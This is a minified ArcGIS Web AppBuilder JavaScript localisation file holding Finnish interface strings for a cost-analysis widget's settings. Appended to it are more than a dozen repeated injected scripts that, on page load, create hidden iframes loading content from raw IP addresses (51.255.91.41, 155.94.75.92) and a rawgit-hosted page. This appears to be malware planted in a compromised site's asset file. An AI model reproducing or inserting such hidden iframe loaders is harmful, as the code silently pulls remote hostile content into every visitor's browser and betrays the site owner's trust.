// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"M\u00e4\u00e4rit\u00e4 kokoonpanoteksti:",generalSettings:{tabTitle:"Yleiset asetukset",measurementUnitLabel:"Mittayksikk\u00f6",currencyLabel:"Mittaustuloksen symboli",roundCostLabel:"Py\u00f6rist\u00e4 kustannus",projectOutputSettings:"Projektin tulosasetukset",typeOfProjectAreaLabel:"Projektialueen tyyppi",bufferDistanceLabel:"Puskurin et\u00e4isyys",roundCostValues:{twoDecimalPoint:"Kaksi desimaaliarvoa",nearestWholeNumber:"L\u00e4hin kokonaisluku",
nearestTen:"L\u00e4hin kymmenluku",nearestHundred:"L\u00e4hin sataluku",nearestThousand:"L\u00e4hin tuhatluku",nearestTenThousands:"L\u00e4hin kymmentuhatluku"},projectAreaType:{outline:"\u00c4\u00e4riviiva",buffer:"Puskuri"},errorMessages:{currency:"Virheellinen valuuttayksikk\u00f6",bufferDistance:"Virheellinen puskurin et\u00e4isyys",outOfRangebufferDistance:"Arvon on oltava yli 0 ja v\u00e4hint\u00e4\u00e4n 100"}},projectSettings:{tabTitle:"Projektiasetukset",costingGeometrySectionTitle:"M\u00e4\u00e4rit\u00e4 kustannusgeometria (valinnainen)",
costingGeometrySectionNote:"Huomautus: t\u00e4m\u00e4n karttatason m\u00e4\u00e4ritys sallii k\u00e4ytt\u00e4j\u00e4n m\u00e4\u00e4ritt\u00e4\u00e4 kohdemallien kustannusyht\u00e4l\u00f6t maantieteeellisen kohteen perusteella.",projectTableSectionTitle:"Projektiasetusten tallennus- ja latausmahdollisuus (valinnainen)",projectTableSectionNote:"Huomautus: m\u00e4\u00e4ritt\u00e4m\u00e4ll\u00e4 kaikki taulukot ja karttatasot k\u00e4ytt\u00e4j\u00e4 voi tallentaa tai ladata projektin my\u00f6hemp\u00e4\u00e4 k\u00e4ytt\u00f6\u00e4 varten.",
costingGeometryLayerLabel:"Kustannusgeometrian karttataso",fieldLabelGeography:"Kentt\u00e4, jolla maantieteellinen kohde nimet\u00e4\u00e4n",projectAssetsTableLabel:"Projektiomaisuuksien taulukko",projectMultiplierTableLabel:"Projektin ylim\u00e4\u00e4r\u00e4isten kustannusten kerrointaulukko",projectLayerLabel:"Projektikarttataso",configureFieldsLabel:"M\u00e4\u00e4rit\u00e4 kent\u00e4t",fieldDescriptionHeaderTitle:"Kent\u00e4n kuvaus",layerFieldsHeaderTitle:"Karttatason kentt\u00e4",selectLabel:"Valitse",
errorMessages:{duplicateLayerSelection:"${layerName} on jo valittu",invalidConfiguration:"Valitse ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eAluekarttatasot, joihin p\u00e4tev\u00e4t seuraavat ehdot, n\u00e4ytet\u00e4\u00e4n: \x3cbr/\x3e \x3cli\x3e\tKarttatasossa on oltava kyselyominaisuus\x3c/li\x3e\x3cli\x3e\tKarttatasossa on oltava GlobalID-kentt\u00e4\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3eValitun Kustannusgeometrian karttatason merkkijono ja numeeriset kent\u00e4t n\u00e4ytet\u00e4\u00e4n avattavassa Kentt\u00e4, jolla maantieteellinen kohde nimet\u00e4\u00e4n -luettelossa.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eTaulukot, joihin p\u00e4tev\u00e4t seuraavat ehdot, n\u00e4ytet\u00e4\u00e4n: \x3cbr/\x3e \x3cli\x3eTaulukossa on oltava muokkausominaisuudet, kuten luonti, poisto ja p\u00e4ivitys\u009d\x3c/li\x3e    \x3cli\x3eTaulukossa on oltava kuusi kentt\u00e4\u00e4, joissa on tarkat nimi- ja aineistotyypit:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tCostEquation (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tScenario (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tTemplateName (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID-tyypin kentt\u00e4)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTaulukot, joihin p\u00e4tev\u00e4t seuraavat ehdot, n\u00e4ytet\u00e4\u00e4n:: \x3cbr/\x3e \x3cli\x3eTaulukossa on oltava muokkausominaisuudet, kuten luonti, poisto ja p\u00e4ivitys\u009d\x3c/li\x3e    \x3cli\x3eTaulukossa on oltava viisi kentt\u00e4\u00e4, joissa on tarkat nimi- ja aineistotyypit:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tType (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tValue (Float-/Double-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e\tCostindex (Integer-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID-tyypin kentt\u00e4))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eAluekarttatasot, joihin p\u00e4tev\u00e4t seuraavat ehdot, n\u00e4ytet\u00e4\u00e4n:: \x3cbr/\x3e \x3cli\x3eKarttatasossa on oltava muokkausominaisuudet, kuten luonti, poisto ja p\u00e4ivitys\u009d\x3c/li\x3e    \x3cli\x3eKarttatasossa on oltava viisi kentt\u00e4\u00e4, joissa on tarkat nimi- ja aineistotyypit:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tProjectName (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3eDescription (String-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float-/Double-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float-/Double-tyypin kentt\u00e4)\x3c/li\x3e\x3cli\x3eGlobalID (GUID-tyypin kentt\u00e4))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Karttatason asetukset",layerNameHeaderTitle:"Karttatason nimi",layerNameHeaderTooltip:"Kartan karttatasojen luettelo",EditableLayerHeaderTitle:"Muokattavissa",EditableLayerHeaderTooltip:"Sis\u00e4llyt\u00e4 karttataso ja sen mallit kustannusten pienoisohjelmaan",SelectableLayerHeaderTitle:"Valittavissa",SelectableLayerHeaderTooltip:"Kohteen geometriaa voi k\u00e4ytt\u00e4\u00e4 uuden kustannuskohteen luontiin",fieldPickerHeaderTitle:"Projektin tunnus (valinnainen)",fieldPickerHeaderTooltip:"Valinnainen kentt\u00e4 (merkkijonotyyppi\u00e4), johon projektin tunnus tallennetaan",
selectLabel:"Valitse",noAssetLayersAvailable:"Valitusta Web-kartasta ei l\u00f6ytynyt omaisuuskarttatasoa",disableEditableCheckboxTooltip:"T\u00e4ss\u00e4 karttatasossa ei ole muokkausominaisuuksia"},costingInfo:{tabTitle:"Kustannustiedot",proposedMainsLabel:"Ehdotetut p\u00e4\u00e4linjat",addCostingTemplateLabel:"Lis\u00e4\u00e4 kustannusmalli",manageScenariosTitle:"Skenaarioiden hallinta",featureTemplateTitle:"Kohdemalli",costEquationTitle:"Kustannusyht\u00e4l\u00f6",geographyTitle:"Maantieteellinen kohde",
scenarioTitle:"Skenaario",actionTitle:"Toiminnot",scenarioNameLabel:"Skenaarion nimi",addBtnLabel:"Lis\u00e4\u00e4",srNoLabel:"Nro.",deleteLabel:"Poista",duplicateScenarioName:"P\u00e4\u00e4llekk\u00e4inen skenaarion nimi",hintText:"\x3cdiv\x3eVihje: k\u00e4yt\u00e4 seuraavia avainsanoja\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: k\u00e4ytt\u00e4\u00e4 saman tyypin omaisuuksien kokonaism\u00e4\u00e4r\u00e4\u00e4 maantieteess\u00e4\x3c/li\x3e \x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: k\u00e4ytt\u00e4\u00e4 viivaomaisuuden pituutta alueomaisuuden pinta-alaa\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: k\u00e4ytt\u00e4\u00e4 viivaomaisuuden kokonaispituutta ja alueomaisuuden kokonaispinta-alaa maantieteess\u00e4\x3c/li\x3e\x3c/ul\x3e Voit k\u00e4ytt\u00e4\u00e4 esimerkiksi seuraavia funktioita:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eMuokkaa kustannusyht\u00e4l\u00f6\u00e4 projektisi tarpeiden mukaisesti.",
noneValue:"Ei mit\u00e4\u00e4n",requiredCostEquation:"Virheellinen kustannusyht\u00e4l\u00f6 kohteelle ${layerName} : ${templateName}",duplicateTemplateMessage:"P\u00e4\u00e4llekk\u00e4inen mallimerkint\u00e4 on kohteessa ${layerName} : ${templateName}",defaultEquationRequired:"${layerName} : ${templateName} edellytt\u00e4\u00e4 oletusyht\u00e4l\u00f6\u00e4",validCostEquationMessage:"Anna kelvollinen kustannusyht\u00e4l\u00f6",costEquationHelpText:"Muokkaa kustannusyht\u00e4l\u00f6\u00e4 projektisi tarpeiden mukaisesti",
scenarioHelpText:"Valitse skenaario projektisi tarpeiden mukaisesti",copyRowTitle:"Kopioi rivi",noTemplateAvailable:"Lis\u00e4\u00e4 v\u00e4hint\u00e4\u00e4n yksi malli karttatasolle ${layerName}",manageScenarioLabel:"Skenaarion hallinta",noLayerMessage:"Anna v\u00e4hint\u00e4\u00e4n yksi karttataso kohteessa ${tabName}",noEditableLayersAvailable:"Karttatasot on valittava muokattaviksi karttatason asetusv\u00e4lilehdell\u00e4"},statisticsSettings:{tabTitle:"Tilastotietojen asetukset",addStatisticsLabel:"Lis\u00e4\u00e4 tilastotiedot",
fieldNameTitle:"Kentt\u00e4",statisticsTitle:"Tunnusteksti",addNewStatisticsText:"Lis\u00e4\u00e4 uudet tilastotiedot",deleteStatisticsText:"Poista tilastotiedot",moveStatisticsUpText:"Siirr\u00e4 tilastotiedot yl\u00f6s",moveStatisticsDownText:"Siirr\u00e4 tilastotiedot alas",selectDeselectAllTitle:"Valitse kaikki"},statisticsType:{countLabel:"Lukum\u00e4\u00e4r\u00e4",averageLabel:"Keskiarvo",maxLabel:"Maksimi",minLabel:"Minimi",summationLabel:"Summa",areaLabel:"Alue",lengthLabel:"Pituus"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});